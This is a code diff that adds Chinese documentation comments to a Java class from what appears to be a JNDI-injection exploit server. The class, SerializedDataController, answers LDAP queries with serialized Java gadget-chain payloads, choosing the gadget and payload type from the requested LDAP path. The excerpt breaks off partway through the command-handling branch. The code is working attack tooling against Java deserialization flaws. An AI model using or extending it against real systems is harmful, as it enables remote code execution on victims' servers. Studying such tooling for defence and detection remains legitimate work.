@@ -31,50 +31,75 @@ public class SerializedDataController implements LdapController {
     public static        CommandLine cmdLine;
     private static final int         USAGE_CODE = 64;
 
+    /**
+     发送LDAP结果和重定向URL
+     @param result InMemoryInterceptedSearchResult类型的结果
+     @param base 基本远程参考负载字符串
+     @throws Exception 异常
+     */
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         System.out.println(ansi().render("@|green [+]|@Send LDAP result for" + base + " with javaSerializedData attribute"));
         Entry e = new Entry(base);
 
         try {
+            // 获取与载荷类型相关的有效负载类
             final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(String.valueOf(gadgetType));
+            // 实例化有效负载对象
             ObjectPayload                        payload      = payloadClass.newInstance();
+            // 获取有效负载的对象
             Object                               object       = payload.getObject(payloadType, params);
 
             ByteArrayOutputStream out   = new ByteArrayOutputStream();
             byte[]                bytes = Serializer.serialize(object, out);
 
+            // 设置Java类名属性和Java序列化数据属性，并将搜索条目发送至结果中
             e.addAttribute("javaClassName", "foo");
             e.addAttribute("javaSerializedData", bytes);
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         } catch (Throwable er) {
+            // 如果生成或序列化有效负载时出现错误，则打印错误信息和堆栈跟踪
             System.err.println("Error while generating or serializing payload");
             er.printStackTrace();
         }
     }
 
+    /**
+     处理传入的参数 base
+     @param base 传入的参数
+     @throws UnSupportedPayloadTypeException 不支持的载荷类型异常
+     @throws IncorrectParamsException 错误的参数异常
+     @throws UnSupportedGadgetTypeException 不支持的 Gadget 类型异常
+     */
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
         try {
+            // 获取第一个斜杠的索引
             int firstIndex  = base.indexOf("/");
+            // 获取第二个斜杠的索引
             int secondIndex = base.indexOf("/", firstIndex + 1);
             try {
+                // 将类型值设为从第一个斜杠后的字符串到第二个斜杠前（不包括第二个斜杠）所表示的字符串
                 gadgetType = base.substring(firstIndex + 1, secondIndex);
                 System.out.println("[+] GaddgetType >> " + gadgetType);
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
             }
 
+            // 获取第三个斜杠的索引
             int thirdIndex = base.indexOf("/", secondIndex + 1);
+            // 若第三个斜杠不存在，则把其设置成为字符串的长度
             if (thirdIndex < 0) thirdIndex = base.length();
             try {
+                // 将类型值设为从第二个斜杠后的字符串到第三个斜杠前（不包括第三个斜杠）所表示的字符串转换为 PayloadType 枚举类型
                 payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex));
                 //System.out.println("[+] PayloadType >> " + payloadType);
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
             }
 
+            // 如果载荷类型为 nu1r，则执行以下语句块
             if (payloadType == PayloadType.nu1r) {
                 String arg = Util.getCmdFromBase(base);
                 if (arg.contains(" ")) {
